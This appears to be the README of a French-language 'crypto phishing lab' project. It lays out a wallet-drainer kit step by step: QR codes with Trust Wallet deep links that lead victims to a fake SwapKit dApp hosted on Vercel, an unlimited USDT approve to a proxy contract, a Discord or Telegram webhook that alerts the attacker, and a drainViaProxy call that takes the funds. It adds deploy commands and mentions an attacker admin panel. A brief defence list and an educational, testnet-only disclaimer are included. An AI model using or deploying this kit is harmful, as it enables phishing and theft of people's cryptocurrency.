# 🔬 Crypto Phishing Lab — Sepolia + Trust Wallet

> **Usage éducatif / recherche en cybersécurité uniquement**
> Testé sur Sepolia testnet — aucun fonds réel impliqués

---

## Architecture

```
victime scanne QR
       ↓
Trust Wallet s'ouvre (deep link)
       ↓
Faux dApp SwapKit (Vercel)
       ↓
"Approve USDT" → approve(proxy, MAX_UINT256)
       ↓
Webhook notifie l'attaquant
       ↓
drainViaProxy() → fonds transférés
```

---

## Setup rapide

### 1. Frontend

```bash
npm install
npm run dev
# → http://localhost:5173       (vue victime)
# → http://localhost:5173/admin (panel attaquant)
```

### 2. Variables d'environnement

Créer `.env.local` :
```
VITE_AGGREGATOR_ADDRESS=0x...
VITE_PROXY_ADDRESS=0x...
VITE_USDT_ADDRESS=0x7169D38820dfd117C3FA1f22a697dBA58d90BA06
VITE_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

### 3. Déploiement contrats (Foundry)

```bash
# Installer Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup

# Init projet contrats
forge init phishing-contracts && cd phishing-contracts

# Copier contracts/Deploy.s.sol dans script/Deploy.s.sol

# Déployer sur Sepolia
export PRIVATE_KEY=0x...
forge script script/Deploy.s.sol \
  --rpc-url https://rpc.sepolia.org \
  --broadcast \
  --private-key $PRIVATE_KEY

# Copier les adresses affichées dans .env.local
```

### 4. Déployer sur Vercel

```bash
npm i -g vercel
vercel login
vercel env add VITE_AGGREGATOR_ADDRESS
vercel env add VITE_PROXY_ADDRESS
vercel env add VITE_WEBHOOK_URL
vercel --prod
```

### 5. Générer le QR Trust Wallet

- Aller sur `/admin`
- Les QR codes sont générés automatiquement
- **QR standard** → ouvre dans navigateur mobile
- **QR Trust Wallet** → ouvre directement l'app Trust Wallet

---

## Flow détaillé

| Étape | Action | Technique |
|-------|--------|-----------|
| 1 | Scan QR | `https://link.trustwallet.com/open_url?coin_id=60&url=...` |
| 2 | Trust s'ouvre | Deep link officiel Trust Wallet |
| 3 | Connect wallet | `eth_requestAccounts` |
| 4 | Switch réseau | `wallet_switchEthereumChain` (Sepolia) |
| 5 | Approve | `approve(proxy, 2^256-1)` sur USDT |
| 6 | Webhook | POST vers Discord/Telegram |
| 7 | Drain | `drainViaProxy(token, victim, amount)` |

---

## Défense (ce que tu dois enseigner)

1. **revoke.cash** → révoquer tous les approve suspects
2. **Vérifier l'URL** avant de connecter son wallet
3. **Ne jamais scanner un QR crypto non vérifié**
4. **Pocket Universe** extension → simule les TX avant signature
5. **Lire ce qui est dans le popup** MetaMask/Trust avant de signer
